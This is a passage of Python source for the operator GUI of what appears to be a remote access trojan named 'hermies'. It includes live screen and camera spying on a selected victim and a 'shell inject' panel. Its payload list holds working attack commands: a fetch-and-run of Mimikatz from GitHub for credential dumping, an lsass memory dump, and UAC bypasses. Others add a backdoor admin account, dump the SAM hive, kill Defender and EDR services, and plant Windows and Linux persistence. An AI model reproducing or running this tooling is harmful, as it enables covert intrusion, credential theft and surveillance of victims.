        self._log_widget = scrolledtext.ScrolledText(
            f, bg=T["BG2"], fg=T["FG"], font=FONT_SML,
            state="disabled", wrap=tk.WORD, relief="flat", borderwidth=0)
        self._log_widget.pack(fill=tk.BOTH, expand=True, padx=10, pady=(12, 4))
        bar = tk.Frame(f, bg=T["BG"])
        bar.pack(fill=tk.X, padx=10, pady=(0, 10))
        tk.Button(bar, text="  CLEAR  ", bg=T["ACCENT"], fg=T["HDR_FG"],
                  font=("Segoe UI", 10, "bold"), relief="flat", padx=12, pady=6,
                  command=lambda: self._clear_text(self._log_widget)
                  ).pack(side=tk.RIGHT)

    #  screen tab 

    def _build_screen_tab(self):
        T = THEME
        f = self._make_frame("Screen")
        self.ss_label = tk.Label(f, bg=T["BG"], fg=T["FG_DIM"], font=FONT,
                                 anchor="center", justify="center")
        self.ss_label.pack(fill=tk.BOTH, expand=True, padx=10, pady=(12, 4))
        bar = tk.Frame(f, bg=T["BG"])
        bar.pack(fill=tk.X, padx=10, pady=(0, 10))
        tk.Button(bar, text="  SAVE  ", bg=T["ACCENT"], fg=T["HDR_FG"],
                  font=("Segoe UI", 10, "bold"), relief="flat", padx=12, pady=6,
                  command=self._save_screenshot).pack(side=tk.RIGHT, padx=(4, 0))
        tk.Button(bar, text="  SCREENSHOT  ", bg=T["ACCENT"], fg=T["HDR_FG"],
                  font=("Segoe UI", 10, "bold"), relief="flat", padx=12, pady=6,
                  command=self._screenshot).pack(side=tk.RIGHT, padx=(4, 0))
        tk.Frame(bar, bg=T["BG4"], width=2).pack(side=tk.RIGHT, fill=tk.Y, padx=8, pady=4)
        self._ssshare_stop_btn = tk.Button(
            bar, text="  STOP SHARE  ", bg=T["RED"], fg="white",
            font=("Segoe UI", 10, "bold"), relief="flat", padx=12, pady=6,
            command=self._ssshare_stop)
        self._ssshare_stop_btn.pack(side=tk.RIGHT, padx=(0, 2))
        self._ssshare_start_btn = tk.Button(
            bar, text="  LIVE SHARE  ", bg=T["BG3"], fg=T["ACCENT"],
            font=("Segoe UI", 10, "bold"), relief="flat", padx=12, pady=6,
            command=self._ssshare_start)
        self._ssshare_start_btn.pack(side=tk.RIGHT, padx=(0, 2))
        tk.Label(bar, text="FPS:", bg=T["BG"], fg=T["FG_DIM"], font=FONT).pack(side=tk.RIGHT, padx=(8, 2))
        self._ssshare_fps_var = tk.StringVar(value="2")
        fps_entry = tk.Entry(bar, textvariable=self._ssshare_fps_var, width=4,
                             bg=T["BG3"], fg=T["FG"], insertbackground=T["ACCENT"],
                             font=FONT_MON, relief="flat")
        fps_entry.pack(side=tk.RIGHT, pady=6)
        self._ss_method_lbl = tk.Label(bar, text="", bg=T["BG"], fg=T["FG_DIM"], font=FONT)
        self._ss_method_lbl.pack(side=tk.LEFT)
        self._ssshare_fps_lbl = tk.Label(bar, text="", bg=T["BG"], fg=T["ACCENT"], font=FONT)
        self._ssshare_fps_lbl.pack(side=tk.LEFT, padx=8)

    def _ssshare_start(self):
        if self.selected_cid is None:
            self.log("[screenshare] no target"); return
        if self._ssshare_running:
            self.log("[screenshare] already running"); return
        try:
            fps = max(1, min(10, int(self._ssshare_fps_var.get())))
        except ValueError:
            fps = 2
        self._ssshare_interval = 1.0 / fps
        self._ssshare_running  = True
        self._ssshare_frame_times = []
        self.log(f"[screenshare] starting at {fps} fps")
        self._ssshare_thread = threading.Thread(
            target=self._ssshare_worker,
            args=(clients[self.selected_cid]["sock"],),
            daemon=True)
        self._ssshare_thread.start()

    def _ssshare_stop(self):
        self._ssshare_running = False
        self._ssshare_fps_lbl.configure(text="")
        self.log("[screenshare] stopped")

    def _ssshare_worker(self, sock):
        frame_times = []
        while self._ssshare_running:
            t0 = time.time()
            try:
                send_msg(sock, "screenshot", None)
                resp = recv_msg(sock)
                if not resp or not self._ssshare_running:
                    break
                envelope = resp.get("data")
                b64 = None
                if isinstance(envelope, dict):
                    b64 = envelope.get("data")
                elif isinstance(envelope, str):
                    b64 = envelope
                if b64:
                    raw = base64.b64decode(b64)
                    img = Image.open(io.BytesIO(raw))
                    self._ss_pil = img
                    now = time.time()
                    frame_times.append(now)
                    frame_times = [t for t in frame_times if t >= now - 2.0]
                    real_fps = len(frame_times) / 2.0
                    def _upd(i=img, fp=real_fps):
                        w = max(self.ss_label.winfo_width(), 200)
                        h = max(self.ss_label.winfo_height(), 150)
                        thumb = i.copy(); thumb.thumbnail((w, h), Image.LANCZOS)
                        tk_img = ImageTk.PhotoImage(thumb)
                        self.ss_label.configure(image=tk_img, text="")
                        self._ss_image = tk_img
                        self._ssshare_fps_lbl.configure(text=f"{fp:.1f} fps")
                    self.after(0, _upd)
            except Exception as e:
                self.log(f"[screenshare] error: {e}")
                break
            elapsed = time.time() - t0
            wait    = max(0.0, self._ssshare_interval - elapsed)
            if wait:
                time.sleep(wait)
        self._ssshare_running = False
        self.after(0, lambda: self._ssshare_fps_lbl.configure(text=""))

    #  camera tab 

    def _build_camera_tab(self):
        T = THEME
        f = self._make_frame("Camera")
        self.cam_idx_var    = tk.IntVar(value=0)
        self.cam_fps_var    = tk.StringVar(value="10")
        self._cam_frame_times = []
        bar = tk.Frame(f, bg=T["BG"], height=42)
        bar.pack(side=tk.BOTTOM, fill=tk.X, padx=10, pady=(0, 10))
        bar.pack_propagate(False)
        tk.Button(bar, text="  STOP  ", bg=T["ACCENT"], fg=T["HDR_FG"],
                  font=("Segoe UI", 10, "bold"), relief="flat", padx=12, pady=6,
                  command=self._cam_stop_stream).pack(side=tk.RIGHT, padx=(4, 0), pady=4)
        self._cam_live_btn = tk.Button(bar, text="  START  ",
                  bg=T["ACCENT"], fg=T["HDR_FG"], font=("Segoe UI", 10, "bold"),
                  relief="flat", padx=12, pady=6, command=self._cam_toggle_stream)
        self._cam_live_btn.pack(side=tk.RIGHT, pady=4)
        self._cam_fps_lbl = tk.Label(bar, text="", bg=T["BG"], fg=T["ACCENT"], font=FONT)
        self._cam_fps_lbl.pack(side=tk.LEFT, padx=4)
        self.cam_label = tk.Label(f, bg=T["BG"], fg=T["FG_DIM"], font=("Segoe UI", 10))
        self.cam_label.pack(side=tk.TOP, fill=tk.BOTH, expand=True, padx=10, pady=(10, 4))

    #  task tab 

    def _build_task_tab(self):
        T = THEME
        f = self._make_frame("Task")
        top = tk.Frame(f, bg=T["BG2"], height=32)
        top.pack(fill=tk.X); top.pack_propagate(False)
        tk.Label(top, text="TARGET:", bg=T["BG2"], fg=T["FG_DIM"],
                 font=("Segoe UI", 9, "bold")).pack(side=tk.LEFT, padx=(12, 4), pady=6)
        self._task_target_lbl = tk.Label(top, text="none selected",
                                         bg=T["BG2"], fg=T["ACCENT"],
                                         font=("Segoe UI", 9, "bold"))
        self._task_target_lbl.pack(side=tk.LEFT, pady=6)
        pane = tk.PanedWindow(f, orient=tk.HORIZONTAL, bg=T["BG"],
                              sashwidth=4, sashrelief="flat")
        pane.pack(fill=tk.BOTH, expand=True)
        left_host = tk.Frame(pane, bg=T["BG2"])
        pane.add(left_host, minsize=340, width=460)
        canvas_l  = tk.Canvas(left_host, bg=T["BG2"], highlightthickness=0)
        sb_l      = ttk.Scrollbar(left_host, orient=tk.VERTICAL, command=canvas_l.yview)
        canvas_l.configure(yscrollcommand=sb_l.set)
        sb_l.pack(side=tk.RIGHT, fill=tk.Y)
        canvas_l.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        left = tk.Frame(canvas_l, bg=T["BG2"])
        cwin = canvas_l.create_window((0, 0), window=left, anchor="nw")
        left.bind("<Configure>", lambda e: canvas_l.configure(scrollregion=canvas_l.bbox("all")))
        canvas_l.bind("<Configure>", lambda e: canvas_l.itemconfig(cwin, width=e.width))
        def _mw(e): canvas_l.yview_scroll(int(-1 * (e.delta / 120)), "units")
        canvas_l.bind_all("<MouseWheel>", _mw)
        tk.Label(left, text="SHELL INJECT", bg=T["BG2"], fg=T["ACCENT"],
                 font=("Segoe UI", 10, "bold")).pack(anchor="w", padx=12, pady=(10, 2))
        tk.Frame(left, bg=T["BG4"], height=1).pack(fill=tk.X, padx=12, pady=4)
        type_row = tk.Frame(left, bg=T["BG2"])
        type_row.pack(fill=tk.X, padx=12, pady=(4, 0))
        tk.Label(type_row, text="Shell:", bg=T["BG2"], fg=T["FG_DIM"],
                 font=FONT).pack(side=tk.LEFT, padx=(0, 8))
        self._task_shell_var = tk.StringVar(value="powershell")
        for v, lbl_text in (("powershell", "PowerShell"), ("bash", "Bash"), ("cmd", "CMD")):
            tk.Radiobutton(type_row, text=lbl_text, variable=self._task_shell_var, value=v,
                           bg=T["BG2"], fg=T["FG"], selectcolor=T["BG3"],
                           activebackground=T["BG2"], activeforeground=T["ACCENT"],
                           font=FONT, bd=0, highlightthickness=0, indicatoron=0,
                           padx=10, pady=4, relief="flat", cursor="hand2"
                           ).pack(side=tk.LEFT, padx=2)
        tk.Frame(left, bg=T["BG4"], height=1).pack(fill=tk.X, padx=12, pady=6)
        tk.Label(left, text="Command / Script:", bg=T["BG2"], fg=T["FG_DIM"],
                 font=FONT).pack(anchor="w", padx=12)
        self._task_cmd_box = tk.Text(
            left, bg=T["BG3"], fg=T["FG"], font=FONT_MON, height=6,
            insertbackground=T["ACCENT"], selectbackground=T["BG4"],
            selectforeground=T["ACCENT"], relief="flat", borderwidth=1,
            highlightbackground=T["BG4"], highlightthickness=1,
            wrap=tk.NONE, undo=True)
        self._task_cmd_box.pack(fill=tk.X, padx=12, pady=(4, 0))
        self._task_cmd_box.bind("<Control-Return>", lambda e: self._task_run())
        run_row = tk.Frame(left, bg=T["BG2"])
        run_row.pack(fill=tk.X, padx=12, pady=(6, 0))
        tk.Button(run_row, text="  RUN  (Ctrl+Enter)",
                  bg=T["ACCENT"], fg=T["HDR_FG"], font=("Segoe UI", 10, "bold"),
                  relief="flat", padx=14, pady=6, cursor="hand2",
                  command=self._task_run).pack(side=tk.LEFT)
        tk.Button(run_row, text="clear", bg=T["BG3"], fg=T["FG"], font=FONT,
                  relief="flat", padx=10, cursor="hand2",
                  command=lambda: self._task_cmd_box.delete("1.0", tk.END)
                  ).pack(side=tk.LEFT, padx=(8, 0))
        PAYLOAD_GROUPS = [
            ("Recon", [
                ("whoami", "powershell", "whoami /all"),
                ("sysinfo", "powershell",
                 "Get-ComputerInfo | Select-Object CsName,OsName,OsVersion,"
                 "OsArchitecture,CsProcessors,CsTotalPhysicalMemory"),
                ("proc list", "powershell",
                 "Get-Process | Select-Object Name,Id,CPU | Sort-Object CPU -Descending | Select -First 25"),
                ("net ifaces", "powershell",
                 "Get-NetIPAddress | Select-Object InterfaceAlias,IPAddress,AddressFamily"),
                ("env dump", "powershell", "Get-ChildItem Env: | Format-Table -AutoSize"),
                ("arp+hosts", "cmd", "arp -a & type %SystemRoot%\\System32\\drivers\\etc\\hosts"),
                ("clipboard", "powershell", "Get-Clipboard"),
                ("bash id", "bash", "whoami && id && hostname"),
                ("bash net", "bash", "ip a 2>/dev/null || ifconfig"),
                ("bash procs", "bash", "ps aux --sort=-%cpu | head -20"),
                ("bash os",   "bash", "uname -a && cat /etc/os-release 2>/dev/null"),
                ("bash users","bash", "who && last -n 20"),
                ("bash crons","bash", "crontab -l 2>/dev/null; ls /etc/cron* 2>/dev/null"),
                ("bash mounts","bash","mount | grep -v cgroup; df -h"),
                ("bash env",  "bash", "env"),
                ("bash lsof", "bash", "lsof -i 2>/dev/null | head -30"),
                ("bash ss",   "bash", "ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null"),
                ("bash iptables","bash","iptables -L -n 2>/dev/null; nft list ruleset 2>/dev/null"),
                ("bash dmesg","bash", "dmesg | tail -40"),
                ("bash etc/passwd","bash","cat /etc/passwd"),
                ("bash sudoers","bash","sudo -l 2>&1"),
            ]),
            ("Privesc / UAC", [
                ("kiwi", "powershell",
                 "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/"
                 "BC-SECURITY/Empire/main/empire/server/data/module_source/credentials/"
                 "Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"),
                ("dump lsass", "powershell",
                 "$p=(Get-Process lsass).Id; rundll32.exe C:\\Windows\\System32\\comsvcs.dll, "
                 "MiniDump $p C:\\Windows\\Temp\\lsass.dmp full"),
                ("uac fodhelper", "powershell",
                 "New-Item -Path HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command "
                 "-Value 'cmd.exe /c start cmd.exe' -Force; "
                 "New-ItemProperty -Path HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command "
                 "-Name DelegateExecute -Value '' -Force; "
                 "Start-Process fodhelper.exe -WindowStyle Hidden"),
                ("uac sdclt", "powershell",
                 "New-Item -Path 'HKCU:\\Software\\Classes\\exefile\\shell\\runas\\command' "
                 "-Value 'cmd.exe /c start cmd.exe' -Force; "
                 "Start-Process sdclt.exe -WindowStyle Hidden"),
                ("disable UAC", "powershell",
                 "Set-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\"
                 "Policies\\System -Name EnableLUA -Value 0 -Force"),
                ("add admin", "cmd",
                 "net user hermies H3rm!esR@T /add & net localgroup administrators hermies /add"),
                ("dump SAM", "cmd",
                 "reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hive /y & "
                 "reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.hive /y"),
            ]),
            ("Process", [
                ("list procs", "powershell",
                 "Get-Process | Sort-Object CPU -Desc | Select -First 30 | Format-Table Name,Id,CPU,WS -Auto"),
                ("kill Defender", "powershell",
                 "Stop-Process -Name MsMpEng -Force -EA SilentlyContinue"),
                ("disable WinDefend", "cmd",
                 "sc stop WinDefend & sc config WinDefend start= disabled"),
                ("kill EDR batch", "powershell",
                 "$edr='MsMpEng','SenseCncProxy','MsSense','AATPSensor',"
                 "'CylanceSvc','cb','AmSvc','MBAMService','bdservicehost';"
                 "$edr|%{Stop-Process -Name $_ -Force -EA SilentlyContinue;"
                 "sc.exe stop $_;sc.exe config $_ start= disabled}"),
            ]),
            ("Registry", [
                ("list run keys", "powershell",
                 "Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run,"
                 "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run | Format-List"),
                ("add persist", "powershell",
                 "Set-ItemProperty -Path HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run "
                 "-Name 'WindowsUpdate' -Value 'C:\\Windows\\Temp\\hermies.exe'"),
                ("rm persist", "powershell",
                 "Remove-ItemProperty -Path HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run "
                 "-Name 'WindowsUpdate' -EA SilentlyContinue"),
                ("schtask persist", "powershell",
                 "schtasks /create /sc onlogon /tn 'WindowsUpdate' "
                 "/tr 'C:\\Windows\\Temp\\hermies.exe' /ru SYSTEM /f"),
                ("rm schtask", "powershell", "schtasks /delete /tn 'WindowsUpdate' /f"),
                ("dump SAM", "cmd",
                 "reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hive /y & "
                 "reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.hive /y"),
            ]),
            ("🃏 Troll", [(lbl, shell, cmd)
                         for payloads in TROLL_PAYLOADS.values()
                         for lbl, shell, cmd in payloads]
             + [("messagebox", "__dlg__", "__msgbox__")]),
            ("🐧 Linux Privesc", [
                ("sudo -l",       "bash", "sudo -l 2>&1"),
                ("SUID find",     "bash",
                 "find / -perm -4000 -type f 2>/dev/null | head -30"),
                ("caps",          "bash",
                 "getcap -r / 2>/dev/null | head -30"),
                ("writable svc",  "bash",
                 "find /etc/systemd /lib/systemd /usr/lib/systemd "
                 "-writable -type f 2>/dev/null | head -20"),
                ("cron privesc",  "bash",
                 "find /etc/cron* /var/spool/cron -writable -type f 2>/dev/null; "
                 "cat /etc/crontab 2>/dev/null"),
                ("world-w dirs",  "bash",
                 "find / -writable -type d -not -path '/proc/*' "
                 "-not -path '/sys/*' 2>/dev/null | head -30"),
                ("PATH hijack",   "bash",
                 "echo $PATH; for d in $(echo $PATH | tr ':' ' '); do "
                 "[ -w $d ] && echo WRITABLE: $d; done"),
                ("docker escape", "bash",
                 "id | grep docker && ls /.dockerenv 2>/dev/null; "
                 "find / -name docker.sock 2>/dev/null"),
                ("lxd escape",    "bash", "id | grep lxd 2>&1"),
                ("kernel ver",    "bash", "uname -r && uname -a"),
            ]),
            ("🐧 Linux Persistence", [
                ("crontab",       "bash",
                 "(crontab -l 2>/dev/null; echo '@reboot /tmp/.hermies &') | crontab -"),
                ("bashrc",        "bash",
                 "echo 'nohup /tmp/.hermies &>/dev/null &' >> ~/.bashrc"),
                ("profile",       "bash",
                 "echo 'nohup /tmp/.hermies &>/dev/null &' >> ~/.profile"),
                ("systemd unit",  "bash",
                 "echo '[Unit]\\nDescription=Update\\n[Service]\\nExecStart=/tmp/.hermies\\n"
                 "Restart=always\\n[Install]\\nWantedBy=multi-user.target' "
                 "> /etc/systemd/system/update.service 2>/dev/null && "
                 "systemctl daemon-reload && systemctl enable update.service"),
                ("authorized_keys","bash",
                 "mkdir -p ~/.ssh && chmod 700 ~/.ssh && "
                 "echo 'YOUR_PUBKEY_HERE' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"),
                ("ld.so.preload", "bash",
                 "echo '/tmp/hermlib.so' | sudo tee /etc/ld.so.preload 2>/dev/null"),
                ("rm persist",    "bash",
                 "crontab -r 2>/dev/null; "
                 "sed -i '/hermies/d' ~/.bashrc ~/.profile 2>/dev/null; "
                 "systemctl disable update.service 2>/dev/null; "
                 "rm -f /etc/systemd/system/update.service 2>/dev/null"),
            ]),
        ]
        for group_label, payloads in PAYLOAD_GROUPS:
            tk.Frame(left, bg=T["BG4"], height=1).pack(fill=tk.X, padx=12, pady=(8, 2))
            gh = tk.Frame(left, bg=T["BG2"])
            gh.pack(fill=tk.X, padx=12, pady=(2, 0))
            tk.Label(gh, text=group_label, bg=T["BG2"], fg=T["ACCENT"],
                     font=("Segoe UI", 8, "bold")).pack(side=tk.LEFT)
            wrap_host = tk.Frame(left, bg=T["BG2"])
            wrap_host.pack(fill=tk.X, padx=12, pady=(2, 0))
            btns = []
            for btn_lbl, shell, cmd in payloads:
                if shell == "__dlg__" and cmd == "__msgbox__":
                    b = tk.Button(wrap_host, text=btn_lbl, bg=T["BG4"], fg=T["FG"],
                                  font=("Segoe UI", 8), relief="flat", padx=6, pady=3,
                                  cursor="hand2",
                                  command=lambda: self._troll_msgbox_dialog())
                else:
                    b = tk.Button(wrap_host, text=btn_lbl, bg=T["BG4"], fg=T["FG"],
                                  font=("Segoe UI", 8), relief="flat", padx=6, pady=3,
                                  cursor="hand2",
                                  command=lambda s=shell, c=cmd: self._task_load_payload(s, c))
                btns.append(b)
            def _reflow(event, host=wrap_host, buttons=btns):
                host.update_idletasks()
                W = host.winfo_width()
                if W < 10: return
                x = y = 0; row_h = 0
                for b in buttons:
                    b.update_idletasks()
                    bw = b.winfo_reqwidth()
                    bh = b.winfo_reqheight()
                    if x + bw > W and x > 0:
                        x = 0; y += row_h + 2; row_h = 0
                    b.place(x=x, y=y); x += bw + 2
                    row_h = max(row_h, bh)
                host.configure(height=max(1, y + row_h + 4))
            wrap_host.bind("<Configure>", _reflow)
            self.after(50, lambda h=wrap_host, b=btns: _reflow(None, h, b))
        tk.Frame(left, bg=T["BG4"], height=1).pack(fill=tk.X, padx=12, pady=8)
        tk.Label(left, text="History (double-click to reload):", bg=T["BG2"], fg=T["FG_DIM"],
                 font=FONT).pack(anchor="w", padx=12)
        self._task_history_lb = tk.Listbox(
            left, bg=T["BG3"], fg=T["FG"], font=FONT_SML,
            selectbackground=T["ACCENT"], selectforeground=T["HDR_FG"],
            height=5, relief="flat", borderwidth=0,
            highlightthickness=0, activestyle="none")
        self._task_history_lb.pack(fill=tk.X, padx=12, pady=(4, 12))
        self._task_history_lb.bind("<Double-Button-1>", self._task_history_load)
        right = tk.Frame(pane, bg=T["BG"],
                         highlightbackground=T["ACCENT"], highlightthickness=1)
        pane.add(right, minsize=300)
        out_hdr = tk.Frame(right, bg=T["BG2"], height=28)
        out_hdr.pack(fill=tk.X); out_hdr.pack_propagate(False)
        tk.Label(out_hdr, text="Output", bg=T["BG2"], fg=T["ACCENT"],
                 font=("Segoe UI", 9, "bold")).pack(side=tk.LEFT, padx=10, pady=4)
        tk.Button(out_hdr, text="clear", bg=T["BG2"], fg=T["FG_DIM"],
                  font=("Segoe UI", 8), relief="flat", cursor="hand2",
                  command=lambda: self._clear_text(self._task_out_widget)
                  ).pack(side=tk.RIGHT, padx=8, pady=2)
        self._task_out_widget = scrolledtext.ScrolledText(
            right, bg=T["BG"], fg=T["FG"], font=FONT_MON,
            state="disabled", wrap=tk.WORD, relief="flat", borderwidth=0,
            insertbackground=T["ACCENT"], selectbackground=T["BG4"],
            selectforeground=T["ACCENT"])
        self._task_out_widget.pack(fill=tk.BOTH, expand=True)

    #  payload center tab 

    def _build_payload_center_tab(self):
        T = THEME
        f = self._make_frame("PayloadCenter")

        #  header bar 
        hdr = tk.Frame(f, bg=T["BG2"], height=36)
        hdr.pack(fill=tk.X); hdr.pack_propagate(False)
        tk.Label(hdr, text="PAYLOAD CENTER", bg=T["BG2"], fg=T["ACCENT"],
                 font=("Segoe UI", 11, "bold")).pack(side=tk.LEFT, padx=14, pady=6)
        tk.Label(hdr, text="TARGET:", bg=T["BG2"], fg=T["FG_DIM"],
                 font=("Segoe UI", 9, "bold")).pack(side=tk.LEFT, padx=(20, 4), pady=6)
        self._pc_target_lbl = tk.Label(hdr, text="none selected",
                                       bg=T["BG2"], fg=T["ACCENT"],
                                       font=("Segoe UI", 9, "bold"))
        self._pc_target_lbl.pack(side=tk.LEFT, pady=6)

        #  three-pane layout 
        pane = tk.PanedWindow(f, orient=tk.HORIZONTAL, bg=T["BG"],
                              sashwidth=4, sashrelief="flat")
        pane.pack(fill=tk.BOTH, expand=True)

        #  LEFT: library list 
        left = tk.Frame(pane, bg=T["BG2"])
        pane.add(left, minsize=200, width=260)

        lib_hdr = tk.Frame(left, bg=T["BG2"], height=28)
        lib_hdr.pack(fill=tk.X); lib_hdr.pack_propagate(False)
        tk.Label(lib_hdr, text="LIBRARY", bg=T["BG2"], fg=T["ACCENT"],
                 font=("Segoe UI", 9, "bold")).pack(side=tk.LEFT, padx=10, pady=5)
        tk.Button(lib_hdr, text="⟳", bg=T["BG2"], fg=T["FG_DIM"],
                  font=FONT, relief="flat", cursor="hand2",
                  command=self._pc_refresh_list).pack(side=tk.RIGHT, padx=6, pady=4)

        # search / filter
        sf = tk.Frame(left, bg=T["BG3"], height=26)
        sf.pack(fill=tk.X, padx=6, pady=(0, 2)); sf.pack_propagate(False)
        tk.Label(sf, text="🔍", bg=T["BG3"], fg=T["FG_DIM"],
                 font=("Segoe UI", 9)).pack(side=tk.LEFT, padx=(4, 0))
        self._pc_filter_var = tk.StringVar()
        self._pc_filter_var.trace_add("write", lambda *_: self._pc_refresh_list())
        tk.Entry(sf, textvariable=self._pc_filter_var,
                 bg=T["BG3"], fg=T["FG"], insertbackground=T["ACCENT"],
                 font=FONT_SML, relief="flat",
                 highlightthickness=0).pack(side=tk.LEFT, fill=tk.X, expand=True, pady=2, padx=4)

        # listbox
        lsf = tk.Frame(left, bg=T["BG2"])
        lsf.pack(fill=tk.BOTH, expand=True, padx=6, pady=(0, 4))
        lb_sb = ttk.Scrollbar(lsf, orient=tk.VERTICAL)
        self._pc_lb = tk.Listbox(
            lsf, bg=T["BG3"], fg=T["FG"], font=FONT_SML,
            selectbackground=T["ACCENT"], selectforeground=T["HDR_FG"],
            relief="flat", borderwidth=0, highlightthickness=0, activestyle="none",
            yscrollcommand=lb_sb.set)
        lb_sb.config(command=self._pc_lb.yview)
        self._pc_lb.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        lb_sb.pack(side=tk.LEFT, fill=tk.Y)
        self._pc_lb.bind("<<ListboxSelect>>", self._pc_lb_select)
        self._pc_lb.bind("<Double-Button-1>", lambda e: self._pc_load_to_editor())

        # delete buttons row
        del_row = tk.Frame(left, bg=T["BG2"])
        del_row.pack(fill=tk.X, padx=6, pady=(0, 6))
        tk.Button(del_row, text="🗑 delete selected", bg=T["BG3"], fg=T["RED"],
                  font=("Segoe UI", 8), relief="flat", cursor="hand2",
                  command=self._pc_delete_selected).pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 2))
        tk.Button(del_row, text="🗑 delete all", bg=T["BG3"], fg=T["RED"],
                  font=("Segoe UI", 8), relief="flat", cursor="hand2",
                  command=self._pc_delete_all).pack(side=tk.LEFT, fill=tk.X, expand=True)

        #  MIDDLE: editor 
        mid = tk.Frame(pane, bg=T["BG2"])
        pane.add(mid, minsize=360, width=600)

        # save-to-library bar
        save_bar = tk.Frame(mid, bg=T["BG2"], height=36)
        save_bar.pack(fill=tk.X); save_bar.pack_propagate(False)
        tk.Label(save_bar, text="Name:", bg=T["BG2"], fg=T["FG_DIM"],
                 font=FONT).pack(side=tk.LEFT, padx=(10, 2), pady=8)
        self._pc_name_var = tk.StringVar()
        tk.Entry(save_bar, textvariable=self._pc_name_var,
                 bg=T["BG3"], fg=T["FG"], insertbackground=T["ACCENT"],
                 font=FONT_SML, relief="flat", width=18,
                 highlightbackground=T["BG4"], highlightthickness=1
                 ).pack(side=tk.LEFT, pady=6, padx=(0, 6))
        tk.Label(save_bar, text="Tags:", bg=T["BG2"], fg=T["FG_DIM"],
                 font=FONT).pack(side=tk.LEFT, padx=(0, 2))
        self._pc_tags_var = tk.StringVar()
        tk.Entry(save_bar, textvariable=self._pc_tags_var,
                 bg=T["BG3"], fg=T["FG"], insertbackground=T["ACCENT"],
                 font=FONT_SML, relief="flat", width=14,
                 highlightbackground=T["BG4"], highlightthickness=1
                 ).pack(side=tk.LEFT, pady=6, padx=(0, 6))
        tk.Button(save_bar, text="💾 save to library",
                  bg=T["BG3"], fg=T["FG"], font=FONT, relief="flat",
                  padx=8, cursor="hand2",
                  command=self._pc_save_to_library).pack(side=tk.LEFT, pady=6)

        tk.Frame(mid, bg=T["BG4"], height=1).pack(fill=tk.X, padx=8, pady=0)

        # shell selector row
        sh_row = tk.Frame(mid, bg=T["BG2"], height=32)
        sh_row.pack(fill=tk.X); sh_row.pack_propagate(False)
        tk.Label(sh_row, text="Shell:", bg=T["BG2"], fg=T["FG_DIM"],
                 font=FONT).pack(side=tk.LEFT, padx=(10, 6), pady=6)
        self._pc_shell_var = tk.StringVar(value="powershell")
        for v, lbl_t in (("powershell", "PowerShell"), ("bash", "Bash"), ("cmd", "CMD")):
            tk.Radiobutton(sh_row, text=lbl_t, variable=self._pc_shell_var, value=v,
                           bg=T["BG2"], fg=T["FG"], selectcolor=T["BG3"],
                           activebackground=T["BG2"], activeforeground=T["ACCENT"],
                           font=FONT, bd=0, highlightthickness=0, indicatoron=0,
                           padx=10, pady=3, relief="flat", cursor="hand2"
                           ).pack(side=tk.LEFT, padx=2)

        tk.Frame(mid, bg=T["BG4"], height=1).pack(fill=tk.X, padx=8, pady=0)

        # editor label
        tk.Label(mid, text="Payload editor", bg=T["BG2"], fg=T["FG_DIM"],
                 font=FONT).pack(anchor="w", padx=10, pady=(6, 2))

        # text editor
        self._pc_editor = tk.Text(
            mid, bg=T["BG3"], fg=T["FG"], font=FONT_MON,
            insertbackground=T["ACCENT"], selectbackground=T["BG4"],
            selectforeground=T["ACCENT"], relief="flat", borderwidth=0,
            highlightbackground=T["BG4"], highlightthickness=1,
            wrap=tk.NONE, undo=True)
        self._pc_editor.pack(fill=tk.BOTH, expand=True, padx=8, pady=(0, 6))

        # import-from-file row
        imp_row = tk.Frame(mid, bg=T["BG2"], height=36)
        imp_row.pack(fill=tk.X); imp_row.pack_propagate(False)
        tk.Button(imp_row, text="📂 import from file…",
                  bg=T["BG3"], fg=T["FG"], font=FONT, relief="flat",
                  padx=8, cursor="hand2",
                  command=self._pc_import_file).pack(side=tk.LEFT, padx=10, pady=6)
        tk.Button(imp_row, text="📁 import folder…",
                  bg=T["BG3"], fg=T["FG"], font=FONT, relief="flat",
                  padx=8, cursor="hand2",
                  command=self._pc_import_folder).pack(side=tk.LEFT, padx=(0, 6), pady=6)
        tk.Button(imp_row, text="✂ clear editor",
                  bg=T["BG3"], fg=T["FG_DIM"], font=("Segoe UI", 8), relief="flat",
                  padx=6, cursor="hand2",
                  command=lambda: self._pc_editor.delete("1.0", tk.END)
                  ).pack(side=tk.LEFT, pady=6)

        #  RIGHT: actions 
        right = tk.Frame(pane, bg=T["BG"],
                         highlightbackground=T["ACCENT"], highlightthickness=1)
        pane.add(right, minsize=180, width=200)

        tk.Label(right, text="ACTIONS", bg=T["BG"], fg=T["ACCENT"],
                 font=("Segoe UI", 10, "bold")).pack(anchor="w", padx=12, pady=(14, 4))
        tk.Frame(right, bg=T["BG4"], height=1).pack(fill=tk.X, padx=12, pady=4)

        tk.Button(right, text="  type command",
                  bg=T["BG3"], fg=T["FG"], font=FONT, relief="flat",
                  padx=10, pady=6, cursor="hand2", anchor="w",
                  command=self._pc_type_command).pack(fill=tk.X, padx=12, pady=(0, 4))

        tk.Frame(right, bg=T["BG4"], height=1).pack(fill=tk.X, padx=12, pady=(0, 4))

        tk.Button(right, text="  load to Task",
                  bg=T["BG3"], fg=T["FG"], font=FONT, relief="flat",
                  padx=10, pady=6, cursor="hand2", anchor="w",
                  command=self._pc_send_to_task).pack(fill=tk.X, padx=12, pady=4)

        tk.Button(right, text="  run on target",
                  bg=T["ACCENT"], fg=T["HDR_FG"],
                  font=("Segoe UI", 10, "bold"), relief="flat",
                  padx=10, pady=6, cursor="hand2", anchor="w",
